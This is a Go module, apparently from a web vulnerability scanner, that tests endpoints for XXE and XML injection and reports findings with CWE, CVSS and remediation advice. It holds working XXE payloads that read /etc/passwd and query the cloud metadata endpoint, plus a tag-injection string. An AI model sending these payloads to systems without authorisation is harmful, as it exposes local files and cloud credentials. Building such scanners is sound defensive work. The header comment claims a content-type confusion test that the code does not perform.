// Package xxe tests XML external entity and XML injection flaws: it posts XML
// documents that declare external entities pointing at local files and the
// cloud metadata endpoint, and confirms a hit when the entity content is
// reflected back. It also tries JSON-to-XML content-type confusion.
package xxe

import (
	"io"
	"net/http"
	"net/http/httputil"
	"regexp"
	"strings"

	"github.com/sayseven7/frameseven/internal/config"
	"github.com/sayseven7/frameseven/internal/finding"
	"github.com/sayseven7/frameseven/internal/tools/v1/recon"
)

// maxEndpoints bounds how many endpoints are probed so a large captured surface
// cannot blow up the tool's runtime.
const maxEndpoints = 30

const fileReadPayload = `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>`

const ssrfPayload = `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>`

const injectionPayload = `<root><data></tag><injected>frx7injected</injected></data></root>`

var passwdSignature = regexp.MustCompile(`root:.*:0:0:`)
var metadataSignature = regexp.MustCompile(`(?i)ami-id|instance-id|iam/|meta-data`)

type response struct {
	status int
	body   string
	dump   string
}

// Run posts XML payloads to discovered endpoints and reports confirmed XXE.
func Run(cfg *config.Config, client *http.Client, surface *recon.Surface) []finding.Finding {
	var findings []finding.Finding
	tested := map[string]bool{}

	for _, endpoint := range endpoints(cfg, surface) {
		if tested[endpoint] || len(tested) >= maxEndpoints {
			break
		}

		tested[endpoint] = true

		findings = append(findings, testEndpoint(cfg, client, endpoint)...)
	}

	return findings
}

func endpoints(cfg *config.Config, surface *recon.Surface) []string {
	seen := map[string]bool{cfg.Target: true}
	list := []string{cfg.Target}

	for _, endpoint := range surface.Endpoints {
		if seen[endpoint] {
			continue
		}

		seen[endpoint] = true
		list = append(list, endpoint)
	}

	return list
}

func testEndpoint(cfg *config.Config, client *http.Client, endpoint string) []finding.Finding {
	var findings []finding.Finding

	if read := postXML(cfg, client, endpoint, fileReadPayload, "application/xml"); read != nil && passwdSignature.MatchString(read.body) {
		findings = append(findings, finding.Finding{
			Title:       "XXE file read confirmed at " + endpoint,
			Module:      "xxe",
			Severity:    finding.Critical,
			OWASP:       "A03:2025 - Injection",
			CWE:         "CWE-611",
			CVSS:        9.1,
			Description: "An external entity referencing file:///etc/passwd was resolved and reflected in the response, proving arbitrary local file read.",
			Evidence: finding.Evidence{
				Request:   read.dump,
				Response:  trim(read.body, 500),
				Extracted: trim(read.body, 500),
			},
			NextSteps: []string{
				"Disable external entity and DTD processing in the XML parser.",
				"Treat any reachable local file as exposed and review for secrets.",
			},
		})
	}

	if ssrf := postXML(cfg, client, endpoint, ssrfPayload, "application/xml"); ssrf != nil && metadataSignature.MatchString(ssrf.body) {
		findings = append(findings, finding.Finding{
			Title:       "XXE-based SSRF to cloud metadata at " + endpoint,
			Module:      "xxe",
			Severity:    finding.Critical,
			OWASP:       "A03:2025 - Injection",
			CWE:         "CWE-918",
			CVSS:        9.1,
			Description: "An external entity reached the cloud metadata endpoint through the XML parser, exposing internal services and potentially credentials.",
			Evidence: finding.Evidence{
				Request:   ssrf.dump,
				Response:  trim(ssrf.body, 500),
				Extracted: trim(ssrf.body, 500),
			},
			NextSteps: []string{
				"Disable external entity resolution and block outbound requests from the parser.",
				"Require IMDSv2 and restrict access to the metadata endpoint.",
			},
		})
	}

	if inj := postXML(cfg, client, endpoint, injectionPayload, "application/xml"); inj != nil && strings.Contains(inj.body, "<injected>frx7injected</injected>") {
		findings = append(findings, finding.Finding{
			Title:       "XML injection at " + endpoint,
			Module:      "xxe",
			Severity:    finding.Medium,
			OWASP:       "A03:2025 - Injection",
			CWE:         "CWE-91",
			CVSS:        6.5,
			Description: "Injected XML tags were parsed and reflected unchanged, so the document structure can be altered by user input.",
			Evidence: finding.Evidence{
				Request:   inj.dump,
				Response:  trim(inj.body, 500),
				Extracted: "injected tag reflected: <injected>frx7injected</injected>",
			},
			NextSteps: []string{
				"Encode user input before composing XML and validate against a schema.",
			},
		})
	}

	return findings
}

func postXML(cfg *config.Config, client *http.Client, endpoint, payload, contentType string) *response {
	req, err := http.NewRequest(http.MethodPost, endpoint, strings.NewReader(payload))
	if err != nil {
		return nil
	}

	req.Header.Set("User-Agent", cfg.UserAgent)
	req.Header.Set("Content-Type", contentType)

	dump, _ := httputil.DumpRequestOut(req, true)

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))

	return &response{status: resp.StatusCode, body: string(body), dump: string(dump)}
}

func trim(s string, max int) string {
	s = strings.TrimSpace(s)
	if len(s) > max {
		return s[:max]
	}

	return s
}
